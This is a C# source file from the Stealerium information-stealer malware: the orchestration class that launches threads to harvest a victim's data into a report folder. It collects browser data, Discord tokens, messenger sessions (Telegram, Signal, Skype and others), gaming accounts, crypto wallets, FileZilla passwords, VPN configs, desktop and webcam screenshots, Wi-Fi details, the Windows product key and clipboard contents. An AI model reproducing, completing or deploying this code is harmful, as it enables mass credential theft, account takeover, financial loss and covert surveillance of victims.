using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using Stealerium.Clipper;
using Stealerium.Target;
using Stealerium.Target.Browsers.Chromium;
using Stealerium.Target.Browsers.Edge;
using Stealerium.Target.Browsers.Firefox;
using Stealerium.Target.Gaming;
using Stealerium.Target.Messengers;
using Stealerium.Target.System;
using Stealerium.Target.VPN;

namespace Stealerium.Helpers
{
    internal sealed class Report
    {
        public static bool CreateReport(string sSavePath)
        {
            var tasks = new List<Thread>();

            try
            {
                // Create directory for the report
                Directory.CreateDirectory(sSavePath);

                // Create subdirectories for various data
                var browserPath = Path.Combine(sSavePath, "Browsers");
                var messengerPath = Path.Combine(sSavePath, "Messenger");
                var gamingPath = Path.Combine(sSavePath, "Gaming");
                var systemPath = Path.Combine(sSavePath, "System");
                var vpnPath = Path.Combine(sSavePath, "VPN");
                var walletsPath = Path.Combine(sSavePath, "Wallets");
                Directory.CreateDirectory(browserPath);
                Directory.CreateDirectory(messengerPath);
                Directory.CreateDirectory(gamingPath);
                Directory.CreateDirectory(systemPath);
                Directory.CreateDirectory(vpnPath);
                Directory.CreateDirectory(walletsPath);

                // Multi-threaded tasks
                tasks.Add(CreateTask(() => FileGrabber.Run(sSavePath + "\\Grabber")));

                // Chromium, Edge, and Firefox browsers
                tasks.Add(CreateTask(() =>
                {
                    RecoverChrome.Run(browserPath);
                    RecoverEdge.Run(browserPath);
                    RecoverFirefox.Run(browserPath);
                }));

                // Messenger apps
                tasks.Add(CreateTask(() => Discord.WriteDiscord(Discord.GetTokens(), messengerPath + "\\Discord")));
                tasks.Add(CreateTask(() => Pidgin.Get(messengerPath + "\\Pidgin")));
                tasks.Add(CreateTask(() => Outlook.GrabOutlook(messengerPath + "\\Outlook")));
                tasks.Add(CreateTask(() => Target.Messengers.Telegram.GetTelegramSessions(messengerPath + "\\Telegram")));
                tasks.Add(CreateTask(() => Skype.GetSession(messengerPath + "\\Skype")));
                tasks.Add(CreateTask(() => Element.GetSession(messengerPath + "\\Element")));
                tasks.Add(CreateTask(() => Signal.GetSession(messengerPath + "\\Signal")));
                tasks.Add(CreateTask(() => Tox.GetSession(messengerPath + "\\Tox")));
                tasks.Add(CreateTask(() => Icq.GetSession(messengerPath + "\\ICQ")));

                // Gaming sessions
                tasks.Add(CreateTask(() =>
                {
                    Steam.GetSteamSession(gamingPath + "\\Steam");
                    Uplay.GetUplaySession(gamingPath + "\\Uplay");
                    BattleNet.GetBattleNetSession(gamingPath + "\\BattleNET");
                }));
                tasks.Add(CreateTask(() => Minecraft.SaveAll(gamingPath + "\\Minecraft")));

                // Wallets
                tasks.Add(CreateTask(() =>
                {
                    Wallets.GetWallets(walletsPath);
                    Target.Browsers.Chromium.Extensions.GetChromeWallets(walletsPath + "\\Chrome_Wallet");
                    Target.Browsers.Edge.Extensions.GetEdgeWallets(walletsPath + "\\Edge_Wallet");
                }));

                // FileZilla
                tasks.Add(CreateTask(() => FileZilla.WritePasswords(sSavePath + "\\FileZilla")));

                // VPNs
                tasks.Add(CreateTask(() =>
                {
                    ProtonVpn.Save(vpnPath + "\\ProtonVPN");
                    OpenVpn.Save(vpnPath + "\\OpenVPN");
                    NordVpn.Save(vpnPath + "\\NordVPN");
                }));

                // Directories and system info
                tasks.Add(CreateTask(() =>
                {
                    Directory.CreateDirectory(sSavePath + "\\Directories");
                    DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
                }));

                tasks.Add(CreateTask(() =>
                {
                    ProcessList.WriteProcesses(systemPath);
                    ActiveWindows.WriteWindows(systemPath);
                }));

                // Screenshots
                tasks.Add(CreateTask(() =>
                {
                    DesktopScreenshot.Make(systemPath);
                    WebcamScreenshot.Make(systemPath);
                }));

                // Saved WiFi networks
                tasks.Add(CreateTask(() =>
                {
                    Wifi.SavedNetworks(systemPath);
                    Wifi.ScanningNetworks(systemPath);
                }));

                // Windows product key and debug logs
                tasks.Add(CreateTask(() =>
                {
                    File.WriteAllText(systemPath + "\\ProductKey.txt", ProductKey.GetWindowsProductKeyFromRegistry());
                }));

                tasks.Add(CreateTask(() => Logging.Save(systemPath + "\\Debug.txt")));

                // System info
                tasks.Add(CreateTask(() => SysInfo.Save(systemPath + "\\Info.txt")));

                // Clipboard content
                tasks.Add(CreateTask(() => File.WriteAllText(systemPath + "\\Clipboard.txt", Clipboard.GetText())));

                // Installed applications
                tasks.Add(CreateTask(() => InstalledApps.WriteAppsList(systemPath)));

                // Start all threads
                foreach (var task in tasks)
                    task.Start();

                // Wait for all threads to finish
                foreach (var task in tasks)
                    task.Join();

                return Logging.Log("Report created");
            }
            catch (Exception ex)
            {
                return Logging.Log("Failed to create report, error:\n" + ex, false);
            }
        }

        private static Thread CreateTask(ThreadStart action)
        {
            var thread = new Thread(action);
            thread.IsBackground = true;
            return thread;
        }
    }
}
